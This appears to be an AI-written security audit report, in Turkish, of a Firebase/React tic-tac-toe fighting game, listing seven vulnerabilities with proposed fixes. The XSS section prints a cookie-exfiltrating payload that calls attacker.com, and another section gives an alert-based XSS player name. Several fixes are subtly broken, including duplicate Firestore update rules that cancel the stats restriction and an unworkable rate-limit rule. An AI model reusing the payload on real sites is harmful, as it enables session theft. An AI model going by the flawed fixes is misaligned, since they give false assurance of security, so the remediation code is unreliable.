# 🔐 MMA XOX Güvenlik Denetimi Raporu

**Tarih:** November 28, 2025  
**Durum:** ⚠️ **KRİTİK AÇIKLAR TESPIT EDİLDİ**

---

## 📋 Özet

Projede **7 ana güvenlik açığı** tespit edilmiştir:
- **3 Kritik** (Immediate action required)
- **2 Yüksek** (High priority)
- **2 Orta** (Medium priority)

---

## 🔴 KRİTİK AÇIKLAR

### 1. **Firestore Güvenlik Kuralları Eksik / Yok**
**Severity:** 🔴 CRITICAL  
**Dosya:** Firestore Rules (bulunmuyor)

**Problem:**
- Firestore'da hiçbir security rule tanımlanmamış
- **Herhangi biri tüm verileri okuyabilir/yazabilir/silebilir**
- Kullanıcı istatistikleri (points, wins, losses) **herkes tarafından değiştirilebilir**
- Oda verileri (game state) manipüle edilebilir

**Kanıt (Room.tsx):**
```typescript
// NO CHECKS - herkes update yapabilir
await updateDoc(roomRef, {
  turn: gameState.turn == "red" ? "blue" : "red",
  // ...
});

// Update Player Stats - kontrol yok
await updateDoc(userRef, {
  "stats.points": increment(pointChange),
  "stats.wins": increment(1),
  // ...
});
```

**Çözüm:**
```firestore
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    
    // Kullanıcı profilleri
    match /users/{uid} {
      allow read: if request.auth != null;
      allow create, update: if request.auth.uid == uid;
      allow delete: if request.auth.uid == uid;
      
      // Sadece kendi stats'ını güncelle
      allow update: if request.auth.uid == uid && 
        !request.resource.data.diff(resource.data).affectedKeys()
          .hasAny(['points', 'wins', 'losses', 'stats']);
    }
    
    // Oyun odaları
    match /rooms/{roomId} {
      allow read: if request.auth != null || resource.data.isRankedRoom == false;
      allow create: if request.auth != null;
      allow update: if request.auth.uid in [resource.data.hostId, resource.data.guestId];
      allow delete: if request.auth.uid == resource.data.hostId;
    }
    
    // World Rankings (sadece okunabilir)
    match /rankings/{document=**} {
      allow read: if request.auth != null;
      allow write: if false;
    }
  }
}
```

---

### 2. **Oyuncu İstatistikleri Frontenddeki Kodla Manipüle Edilebilir**
**Severity:** 🔴 CRITICAL  
**Dosya:** Room.tsx (Line ~750+)

**Problem:**
```typescript
const updatePlayerStats = async (winner: "red" | "blue" | "draw") => {
    // Kontrol yok - herhangi biri istemci tarafından her oyunu kazanan yapabilir
    const hostIsWinner = winner === "red";
    const guestIsWinner = winner === "blue";
    
    try {
      const hostRef = doc(db, "users", hostEmail);
      const guestRef = doc(db, "users", guestEmail);
      
      await updateDoc(hostRef, {
        "stats.points": increment(hostIsWinner ? 50 : -10), // ← FRONTEND İLE DEĞİŞTİRİLEBİLİR
        "stats.wins": increment(hostIsWinner ? 1 : 0),
      });
```

**İhlal Türü:**
- Client-side game logic
- Backend validation yok
- XHR/DevTools ile `winner` parametresi değiştirilebilir
- Ranking sistemi spoof edilebilir

**Çözüm:**
→ **Callable Cloud Function** kullan (Backend validation)

```typescript
// functions/src/updatePlayerStats.ts
import * as functions from 'firebase-functions';
import * as admin from 'firebase-admin';

export const updatePlayerStatsOnGameEnd = functions.firestore
  .document('rooms/{roomId}')
  .onUpdate(async (change, context) => {
    const before = change.before.data();
    const after = change.after.data();
    
    // Sadece winner set edildiyse işle
    if (!before.winner && after.winner) {
      const { hostEmail, guestEmail, winner } = after;
      
      // Oyun sonucunu doğrula (Firestore'daki game board'dan)
      const hostRef = admin.firestore().doc(`users/${hostEmail}`);
      const guestRef = admin.firestore().doc(`users/${guestEmail}`);
      
      const batch = admin.firestore().batch();
      
      if (winner === 'red') {
        batch.update(hostRef, {
          'stats.wins': admin.firestore.FieldValue.increment(1),
          'stats.points': admin.firestore.FieldValue.increment(50)
        });
        batch.update(guestRef, {
          'stats.losses': admin.firestore.FieldValue.increment(1),
          'stats.points': admin.firestore.FieldValue.increment(-10)
        });
      } else if (winner === 'blue') {
        // ... guest kazandı
      }
      
      await batch.commit();
    }
  });
```

---

### 3. **XSS Açığı - Fighter Verileri Sanitize Edilmemiş**
**Severity:** 🔴 CRITICAL  
**Dosya:** Room.tsx (~Line 1317+)

**Problem:**
```typescript
const updateBox = async (fighter: Fighter) => {
  // Fighter adı direkt olarak render ediliyor
  setFighter00({
    url: fighter.url,       // ← URL validasyon yok
    text: fighter.text,     // ← HTML inject edilebilir
    bg: fighter.bg,
  });
  
  // Render edilirken innerHTML gibi şey kullanıyorsa:
  // <div>{fighter.text}</div>  ← Safe (React escapes)
  // ama fighter.url dışarıdan gelmişse...
};
```

**İhlal Türü:**
- fighters_url JSON'u dışarıdan kontrol edilebiliyorsa:
- `<img src=x onerror="fetch('https://attacker.com?cookies='+document.cookie)">`
- CSRF tokens, session cookies çalınabilir

**Kanıt (AvailableRooms.tsx):**
```typescript
// Firestore'dan gelen data - validasyon yok
rooms.map((room: any) => (
  <div>{room.host}</div>  // Guest isim direkt render
))
```

**Çözüm:**
```typescript
// 1. URL validasyon
const isValidImageUrl = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    return ['https:', 'http:'].includes(parsed.protocol) &&
           ['cdn2.iconfinder.com', 'your-cdn.com'].includes(parsed.hostname);
  } catch {
    return false;
  }
};

// 2. Fighter data sanitization
import DOMPurify from 'dompurify';

const updateBox = async (fighter: Fighter) => {
  // Sadece izin verilen karakterler
  const sanitizedText = fighter.text
    .slice(0, 50)
    .replace(/[^a-zA-Z0-9\s\-]/g, '');
  
  if (!isValidImageUrl(fighter.url)) {
    console.error('Invalid image URL');
    return;
  }
  
  setFighter00({
    url: fighter.url,
    text: sanitizedText,
    bg: fighter.bg,
  });
};

// package.json'a ekle:
// "dompurify": "^3.0.6"
```

---

## 🟠 YÜKSEK ÖNCELIKLI AÇIKLAR

### 4. **Oyuncu Adı Validasyon Eksik (Injection Attack)**
**Severity:** 🟠 HIGH  
**Dosya:** Menu.tsx, AvailableRooms.tsx, Room.tsx

**Problem:**
```typescript
const sanitizeGuestName = (name: string) => {
  const trimmed = (name || "").trim().replace(/\s+/g, " ");
  if (!trimmed) return "";
  return trimmed.slice(0, NAME_MAX);  // ← Sadece length kontrolü!
};

// Firestore'ya yazılıyor:
await setDoc(doc(db, "rooms", newRoomId), {
  host: finalPlayerName,  // ← Kontrol yok, direkt yazılıyor
  // ...
});
```

**Tehdit:**
- Oyuncu adı: `"<img src=x onerror=alert('xss')>"`
- Ranking'te görüntüleniyorsa XSS
- SQL injection benzeri pattern (NoSQL injection)

**Çözüm:**
```typescript
const sanitizePlayerName = (name: string): string => {
  // 1. Uzunluk kontrolü
  const trimmed = (name || "").trim().replace(/\s+/g, " ").slice(0, NAME_MAX);
  
  // 2. Sadece alphanumeric + space + dash
  const sanitized = trimmed.replace(/[^a-zA-Z0-9\s\-]/g, '');
  
  // 3. Boş kontrol
  if (!sanitized) throw new Error("Invalid player name");
  
  // 4. Firestore write rule'da da kontrol et
  return sanitized;
};

// Kullanım:
try {
  const safeName = sanitizePlayerName(playerName);
  await setDoc(doc(db, "rooms", newRoomId), {
    host: safeName,
    // ...
  });
} catch (e) {
  toast.error("Invalid player name");
}
```

---

### 5. **Rate Limiting / Brute Force Koruması Yok**
**Severity:** 🟠 HIGH  
**Dosya:** AuthContext.tsx, Login.tsx

**Problem:**
```typescript
const login = async (email: string, password: string): Promise<void> => {
  // Hiçbir rate limiting yok
  // Attacker 1000x hızlı login denemesi yapabilir
  await signInWithEmailAndPassword(auth, email, password);
};

// Firestore sorgusu da sınırlı yok
const q = query(
  roomsRef,
  where("guest.now", "==", null),
  where("isRankedRoom", "==", false)
);
const querySnapshot = await getDocs(q);  // ← Unlimited queries
```

**Çözüm:**
```typescript
// 1. Firebase Authentication - Console'da etkinleştir
// Settings → Security → Rate Limiting
// (Firebase automatically rate limits excessive login attempts)

// 2. Frontend rate limiting
import { RateLimiter } from 'limiter';

const limiter = new RateLimiter({ tokensPerInterval: 5, interval: "minute" });

const login = async (email: string, password: string) => {
  const remaining = await limiter.removeTokens(1);
  if (remaining < 0) {
    throw new Error("Too many login attempts. Try again later.");
  }
  await signInWithEmailAndPassword(auth, email, password);
};

// 3. Firestore Rule
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /users/{uid} {
      // Rate limiting: 10 reads per minute
      allow read: if request.auth != null && 
        request.time < resource.data.nextReadTime;
    }
  }
}
```

---

## 🟡 ORTA ÖNCELİKLİ AÇIKLAR

### 6. **Ranked Match Doğrulama - Host Email Kontrol Yok**
**Severity:** 🟡 MEDIUM  
**Dosya:** Room.tsx (Line ~787)

**Problem:**
```typescript
const isHost = currentUser?.email === hostEmail;
const isGuest = currentUser?.email === guestEmail;

if (!isHost && !isGuest) {
  // ← Bu kontrol client-side!
  // Attacker currentUser email'i değiştirebilir
}
```

**Çözüm:**
```typescript
// Cloud Function ile doğrula
export const verifyRankedMatchParticipant = functions.https.onCall(
  async (data, context) => {
    if (!context.auth) throw new Error('Unauthenticated');
    
    const { roomId } = data;
    const userEmail = context.auth.token.email;
    
    const roomRef = admin.firestore().doc(`rooms/${roomId}`);
    const roomDoc = await roomRef.get();
    
    const { hostEmail, guestEmail } = roomDoc.data() as any;
    
    if (userEmail !== hostEmail && userEmail !== guestEmail) {
      throw new Error('Not a participant in this room');
    }
    
    return { authorized: true };
  }
);
```

---

### 7. **Sensitive Data Logging**
**Severity:** 🟡 MEDIUM  
**Dosya:** Room.tsx, AuthContext.tsx

**Problem:**
```typescript
console.log("🎮 gameState?.isRankedRoom:", gameState?.isRankedRoom);
console.log("🎮 role:", role, "currentUser?.email:", currentUser?.email);  // ← Email exposed
console.log("userCredential:", userCredential);  // ← User object logged
```

**Risiko:**
- Browser console → DevTools → Network tab
- Session tokens leak
- Email harvest

**Çözüm:**
```typescript
// Production'da disable et
const DEBUG = process.env.NODE_ENV === 'development';

if (DEBUG) {
  console.log('Email:', currentUser?.email);
} else {
  console.log('User authenticated'); // Safe
}

// Veya custom logger
const safeLog = (label: string, isPublic: boolean = true) => {
  if (isPublic) {
    console.log(`[${label}] operation completed`);
  }
};
```

---

## ✅ YAPILACAKLAR LISTESI (Priority Order)

### Hemen (Bu gün)
- [ ] Firestore Security Rules yazıp deploy et
- [ ] `updatePlayerStats` → Cloud Function'a taşı
- [ ] XSS koruması (DOMPurify + URL validation)
- [ ] Player name sanitization

### Kısa vadede (Bu hafta)
- [ ] Rate limiting implement et
- [ ] Ranked match verification → Cloud Function
- [ ] Console logging cleanup (production)
- [ ] CORS configuration (backend)

### Orta vadede (Bu ay)
- [ ] CSRF token validation
- [ ] API key rotation policy
- [ ] Security headers (CSP, X-Frame-Options)
- [ ] Penetration testing

---

## 📝 Kontrol Listesi Şablonu

```markdown
## Security Checklist

### Authentication & Authorization
- [ ] Firestore Security Rules configured
- [ ] UID validation on all operations
- [ ] Token expiration & refresh implemented
- [ ] Rate limiting on auth endpoints

### Data Validation
- [ ] Input sanitization (player names, fighter data)
- [ ] Output encoding (React prevents most XSS)
- [ ] Type checking (TypeScript strict mode)
- [ ] Length limits enforced

### Network Security
- [ ] HTTPS only (Vercel enforces)
- [ ] CORS properly configured
- [ ] CSP headers set
- [ ] API keys never in frontend

### Backend
- [ ] Cloud Functions for stat updates
- [ ] Server-side game logic validation
- [ ] Audit logging enabled
- [ ] Error handling (no info leaks)

### Deployment
- [ ] Environment variables secured
- [ ] Secrets rotation
- [ ] Security Headers configured
- [ ] Monitoring & alerting setup
```

---

## 📞 Destekli Kaynaklar

1. **Firestore Security Rules:** https://firebase.google.com/docs/firestore/security/start
2. **OWASP Top 10:** https://owasp.org/www-project-top-ten/
3. **React Security:** https://react.dev/learn/security
4. **Firebase Best Practices:** https://firebase.google.com/docs/projects/best-practices

---

**Rapor Sonu**  
Sorularınız varsa detaylı anlatım yapabilirim. 🔐
